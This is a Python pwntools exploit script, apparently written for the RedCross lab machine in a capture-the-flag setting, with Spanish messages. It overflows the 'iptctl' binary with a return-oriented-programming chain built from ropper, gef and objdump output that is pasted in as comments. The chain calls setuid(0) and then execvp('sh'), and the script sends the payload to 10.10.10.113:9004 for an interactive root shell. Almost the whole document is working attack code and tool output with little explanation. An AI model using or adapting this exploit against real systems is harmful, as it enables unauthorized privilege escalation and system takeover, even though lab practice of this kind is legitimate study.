import sys
import signal
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":
    
    offset = 29
    junk = b"allow" + b"A"*offset

    # payload = junk + pop_rdi + sh_address + pop_rsi + null + null + execvp()

# ropper --file iptctl --search "pop rdi"
# Load gadgets for section: LOAD
# [LOAD] loading... 100%
# [LOAD] removing double gadgets... 100%
# [INFO] Searching for gadgets: pop rdi

# [INFO] File: iptctl
# 0x0000000000400de3: pop rdi; ret; 
    pop_rdi = p64(0x400de3)

# gef➤  grep "sh"
# [+] Searching 'sh' in memory
# [+] In '/home/sexcott/Desktop/Machines/RedCross/content/iptctl'(0x400000-0x402000), permission=r-x
# 0x40046e - 0x400470  →   "sh" 

    sh_address = p64(0x40046e)

# ropper --file iptctl --search "pop rsi"
# [INFO] Load gadgets from cache
# [LOAD] loading... 100%
# [LOAD] removing double gadgets... 100%
# [INFO] Searching for gadgets: pop rsi

# [INFO] File: iptctl
# 0x0000000000400de1: pop rsi; pop r15; ret; 
    
    pop_rsi = p64(0x400de1)

# objdump -D iptctl | grep "execvp"
# 0000000000400760 <execvp@plt>:
#  400760:	ff 25 f2 18 20 00    	jmp    *0x2018f2(%rip)        # 602058 <execvp@GLIBC_2.2.5>
#  400d13:	e8 48 fa ff ff       	call   400760 <execvp@plt>

    execvp = p64(0x400760)  

#objdump -D iptctl | grep "setuid"
#0000000000400780 <setuid@plt>:
    #  400780:	ff 25 e2 18 20 00    	jmp    *0x2018e2(%rip)        # 602068 <setuid@GLIBC_2.2.5>
#  400d00:	e8 7b fa ff ff       	call   400780 <setuid@plt>

    setuid = p64(0x400780)


    payload = junk
    payload += pop_rdi 
    payload += p64(0x0)
    payload += setuid
    payload += pop_rdi
    payload += sh_address
    payload += pop_rsi
    payload += p64(0x0)
    payload += p64(0x0)
    payload += execvp
    payload += b"\n1.1.1.1\n"

    try:
        p = remote("10.10.10.113", 9004)
    except Exception as e:
        log.error(e)
    
    p.sendline(payload)
    p.interactive()
